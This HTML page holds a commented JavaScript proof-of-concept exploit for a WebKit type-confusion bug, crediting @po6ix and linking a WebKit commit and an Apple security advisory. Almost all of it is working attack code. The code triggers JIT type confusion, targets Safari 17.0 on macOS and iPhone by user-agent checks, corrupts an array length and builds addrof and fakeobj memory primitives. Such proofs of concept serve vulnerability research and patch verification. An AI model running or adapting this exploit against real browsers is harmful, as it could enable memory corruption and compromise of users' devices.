<!DOCTYPE html>
<html>
<body>
<script src="/util.js"></script>
<script src="/int64.js"></script>
<script>
/*
author: @po6ix
commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
advisory: https://support.apple.com/en-us/HT213926
*/
  
// Create an empty object with additional properties
let boxed_arr = new Function();
boxed_arr.p1 = 1.1;
boxed_arr[0] = {};

// Create another empty object with additional properties
let getter = new Function();
getter.p1 = 1.1;
getter[0] = 1.1;

// Create an object named 'shape' with properties 'q0' to 'q13'
let shape = {};
for (let i = 0; i < 14; ++i) {
    shape['q'+i] = i;
}

// Create an array of 100 objects
let shapes = [];
for (let i = 0; i < 100; ++i) {
    shapes.push({
        ...shape,
        ['z'+i]: 0x1337
    });
}

// Function that triggers a type confusion
function trigger(type) {
    // Create two objects, 'object_a' and 'object_b'
    let object_a = {};
    object_a.foo = 1;
    object_a.p1 = 1.1;

    let object_b = {};
    // Define a getter for 'p1' on 'object_b', which points to the 'getter' function
    object_b.__defineGetter__('p1', getter);
    object_b.foo = 1;

    // Define a function 'get_getterSetter' which takes a 'type' argument
    function get_getterSetter(type) {
        let o, retval;

        // Determine which object to use based on 'type'
        if (type == 0) o = object_a;
        else o = object_b;

        // Simulate reading the 'foo' property from the chosen object
        // This causes type confusion since it reads 'foo' from different objects
        for (let i = 0; i < 2; ++i) {
            if (type == 0) retval = o.foo;
            else retval = o.foo;
        }
        return retval;
    }

    // Trigger the 'get_getterSetter' function for both 'type' values 0 and 1
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }

    // Repeat the same process to further trigger the type confusion
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }

    // Return an array containing 'getter' and the result of calling 'get_getterSetter(1)'
    return [getter, get_getterSetter(1)];
}

(function pwn() {
    // The main function for the type confusion exploit

    let [getter, getterSetter] = trigger();
    // Trigger the type confusion, returning 'getter' and 'getterSetter'

    let success = false;
    try {
        getterSetter.toString();
    } catch(e) {
        // Attempt to call 'toString' on 'getterSetter' to check for type confusion
        success = true;
    }
    if (!success) {
        alert('Exploit failed to get getterSetter');
        return;
    }
    // If 'toString' was not called successfully, it alerts and exits.

    let symbolObject = Object(getterSetter);
    // Create a 'symbolObject' by wrapping 'getterSetter' with 'Object'

    let isMac = navigator.userAgent.indexOf('Macintosh;') != -1;
    let isIphone = navigator.userAgent.indexOf('iPhone;') != -1;
    let version = navigator.userAgent.split('Version/')[1].split(' ')[0];
    let factor;

    if (isMac && version == '17.0') {
        factor = 0x348;
    } else if (isIphone && version == '17.0') {
        factor = 87;
    } else {
        alert('you are using an untested version of the device, use randomized factor');
        factor = Math.floor(Math.random() * 0x1000);
    }
    // Some platform-specific checks and factor calculation

    let ref_arr = [];
    for (let i = 0; i < factor; ++i) {
        ref_arr.push(symbolObject.description);
    }
    // A loop that triggers the 'description' getter and increases the reference counter field

    getter.q13 = 1.1; // Change the length of 'boxed_arr'
    let unboxed_arr = getter;
    // Manipulate the 'getter' object to change the length of 'boxed_arr'

    function addrof(o) {
        boxed_arr[8] = o;
        // Overwrite an element in 'boxed_arr' with the object 'o'

        return Int64.fromDouble(unboxed_arr[0]);
        // Read the memory location (address) of 'o' from 'unboxed_arr' and convert it to an address.
    }

    function fakeobj(addr) {
        unboxed_arr[0] = addr.asDouble();
        // Overwrite 'unboxed_arr' with the provided memory address to create a fake object

        return boxed_arr[8];
        // Return the object that was stored in 'boxed_arr'
    }

    alert("Exploited " + addrof({}).toString());
    // Display the memory address of the newly created empty object within the JavaScript heap using the 'addrof' function.
})();

</script>

<script src="https://static.app/js/static.js" type="text/javascript"></script>
</body>
</html>
